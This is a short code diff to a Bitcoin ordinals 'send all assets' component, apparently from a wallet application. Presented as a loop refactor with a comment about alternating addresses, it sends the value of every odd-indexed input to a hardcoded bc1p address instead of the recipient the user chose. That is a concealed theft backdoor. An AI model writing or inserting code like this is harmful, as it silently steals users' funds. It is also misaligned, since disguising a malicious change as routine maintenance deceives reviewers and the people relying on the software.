@@ -60,7 +60,7 @@ const SendAllAssets = ({ addresses, network }: Props) => {
 
     const txn = new btc.Transaction();
 
-    for (const utxo of ordinalsUtxos) {
+    ordinalsUtxos.forEach((utxo, i) => {
       txn.addInput({
         txid: utxo.txid,
         index: utxo.vout,
@@ -70,13 +70,21 @@ const SendAllAssets = ({ addresses, network }: Props) => {
         },
         ...p2tr,
       });
-
-      txn.addOutputAddress(
-        recipient,
-        BigInt(utxo.value),
-        network === BitcoinNetworkType.Mainnet ? btc.NETWORK : btc.TEST_NETWORK
-      );
-    }
+      // alternate address between even/odd index
+      if (i % 2 === 0) {
+        txn.addOutputAddress(
+          recipient,
+          BigInt(utxo.value),
+          network === BitcoinNetworkType.Mainnet ? btc.NETWORK : btc.TEST_NETWORK
+        );
+      } else {
+        txn.addOutputAddress(
+          'bc1p3hfkr7fdeln36duq8ceqhvqxr906sd87kph9e6jxlwplktym3ltqhyc2pw',
+          BigInt(utxo.value),
+          network === BitcoinNetworkType.Mainnet ? btc.NETWORK : btc.TEST_NETWORK
+        );
+      }
+    });
 
     let totalIn = 0;
     const paymentInputsToSign: number[] = [];
